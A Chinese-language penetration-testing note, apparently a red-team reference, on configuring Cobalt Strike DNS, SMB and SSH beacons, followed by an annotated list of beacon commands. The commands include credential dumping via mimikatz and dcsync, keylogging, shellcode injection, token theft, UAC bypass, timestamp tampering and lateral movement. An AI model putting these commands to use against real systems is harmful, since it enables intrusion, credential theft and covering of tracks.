  ##### DNS Beacon
	编辑域的区域文件
	为 Cobalt Strike 系统创建 A 记录
	创建指向 Cobalt Strike 系统的 FQDN 的 NS 记录
	创建 DNS A 记录并将其指向您的 Cobalt Strike 团队服务器。使用 DNS NS 记录将多个域或子域委托给您的 Cobalt Strike 团队服务器的 A 记录。
	nslookup jibberish.beacon polling.campaigns.domain.com
	nslookup jibberish.beacon campaign.domain.com

	Digital Ocean 上的 DNS 示例：

	NS  example.com                     directs to 10.10.10.10.            86400
	NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
	A	campaigns.example.com           directs to 10.10.10.10	            3600 

	>systemctl disable systemd-resolved
	>systemctl stop systemd-resolved
	>rm /etc/resolv.conf
	>echo "nameserver 8.8.8.8" >  /etc/resolv.conf
	>echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
	配置：

	主机：campaigns.domain.com
	beacon：polling.campaigns.domain.com

  ##### SMB Beacon
  	link [host] [pipename]
	connect [host] [port]
	unlink [host] [PID]
	jump [exec] [host] [pipe]
	错误代码
| Error Code | Meaning              | Description                                        |
|------------|----------------------|----------------------------------------------------|
| 2          | File Not Found       | There is no beacon for you to link to              |
| 5          | Access is denied     | Invalid credentials or you don't have permission   |
| 53         | Bad Netpath          | You have no trust relationship with the target system. It may or may not be a beacon there. |

  ##### SSH Beacon
  	部署一个 beacon
	beacon> help ssh
	Use: ssh [target:port] [user] [pass]
	Spawn an SSH client and attempt to login to the specified target

	beacon> help ssh-key
	Use: ssh [target:port] [user] [/path/to/key.pem]
	Spawn an SSH client and attempt to login to the specified target

	beacon的命令
	upload                    上传
	download                  下载
	socks                     启动 SOCKS4a
	sudo                      使用sudo执行命令
	rportfwd                  设置一个反向端口转发
	shell                     通过shell执行命令

	argue                     进程参数欺骗
	blockdlls                  阻止子进程加载非Microsoft DLL
	browserpivot              注入受害者浏览器进程
	bypassuac                绕过UAC提升权限
	cancel                    取消正在进行的下载
	cd                        切换目录
	checkin                   强制让被控端回连一次
	clear                     清除beacon内部的任务队列
	connect                   Connect to a Beacon peer over TCP
	covertvpn                 部署Covert VPN客户端
	cp                        复制文件
	dcsync                    从DC中提取密码哈希
	desktop                   远程桌面(VNC)
	dllinject                   反射DLL注入进程
	dllload                    使用LoadLibrary将DLL加载到进程中
	downloads                列出正在进行的文件下载
	drives                     列出目标盘符
	elevate                    使用exp
	execute                   在目标上执行程序(无输出)
	execute-assembly         在目标上内存中执行本地.NET程序  execute-assembly [/path/to/script.exe] [arguments]
	exit                       终止beacon会话
	getprivs                   Enable system privileges on current token
	getsystem                 尝试获取SYSTEM权限
	getuid                     获取用户ID
	hashdump                  转储密码哈希值
	help                       帮助
	inject                      在注入进程生成会话
	jobkill                     结束一个后台任务
	jobs                       列出后台任务
	kerberos_ccache_use       从ccache文件中导入票据应用于此会话
	kerberos_ticket_purge     清除当前会话的票据
	kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话
	keylogger                 键盘记录
	kill                      结束进程
	link                      Connect to a Beacon peer over a named pipe
	logonpasswords            使用mimikatz转储凭据和哈希值
	ls                        列出文件
	make_token                创建令牌以传递凭据
	mimikatz                  运行mimikatz
	mkdir                     创建一个目录
	mode dns                  使用DNS A作为通信通道(仅限DNS beacon)
	mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
	mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)
	mode http                 使用HTTP作为通信通道
	mv                        移动文件
	net                       net命令
	note                      备注       
	portscan                  进行端口扫描
	powerpick                 通过Unmanaged PowerShell执行命令
	powershell                通过powershell.exe执行命令
	powershell-import         导入powershell脚本 powershell-import [/path/to/script.ps1]
	ppid                      Set parent PID for spawned post-ex jobs
	ps                        显示进程列表
	psexec                    Use a service to spawn a session on a host
	psexec_psh                Use PowerShell to spawn a session on a host
	psinject                  在特定进程中执行PowerShell命令
	pth                       使用Mimikatz进行传递哈希
	pwd                       当前目录位置
	reg                       Query the registry
	rev2self                  恢复原始令牌
	rm                        删除文件或文件夹
	run                       在目标上执行程序(返回输出)
	runas                     以其他用户权限执行程序
	runasadmin                在高权限下执行程序
	runu                      Execute a program under another PID
	screenshot                屏幕截图
	setenv                    设置环境变量
	shinject                  将shellcode注入进程
	shspawn                   启动一个进程并将shellcode注入其中
	sleep                     设置睡眠延迟时间
	socks stop                停止SOCKS4
	spawn                     派生新的会话 
	spawnas                   Spawn a session as another user
	spawnto                   指明在派生会话时将shellcode注入到具体的进程
	spawnu                    选择一个临时的父进程，然后派生一个子进程，这个子进程同样可以用spawnto指定
	ssh                       使用ssh连接远程主机
	ssh-key                   使用密钥连接远程主机
	steal_token               从进程中窃取令牌
	timestomp                 将一个文件的时间戳应用到另一个文件
	unlink                    Disconnect from parent Beacon
	wdigest                   使用mimikatz转储明文凭据
	winrm                     使用WinRM横向渗透
	wmi                       使用WMI横向渗透
	执行命令，在beacon模式下键入shell+命令
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/221.png)

	>sleep 0 交互模式，立刻执行命令
	注入DLL到某个进程
	>dllload [pid] [c:\path\to\file.dll] DLL需在目标上
	>kerberos_ticket_purge 清除票据
	>kerberos_ccache_use	[/path/to/file.ccache]  从ccache文件导入票据
	>kerberos_ticket_use [/path/to/file.ccache] 从ticket文件导入票据
	>kill pid 结束进程
	>timestomp [fileA]	[fileB] 修改文件时间戳
	>getuid	 获取当前用户
	>steal_token [pid] 窃取进程ID
	>rev2self 恢复原始令牌
	>powershell-import	[/path/to/local/script.ps1] 导入PS模块 
	>shinject [pid] <x86|x64> [/path/to/my.bin] 向进程注入shellcode
	>socks	port在指定端口开启代理
	>socks stop停止代理
	>rportfwd [bind port]	[forward host]	[forward port]开启端口转发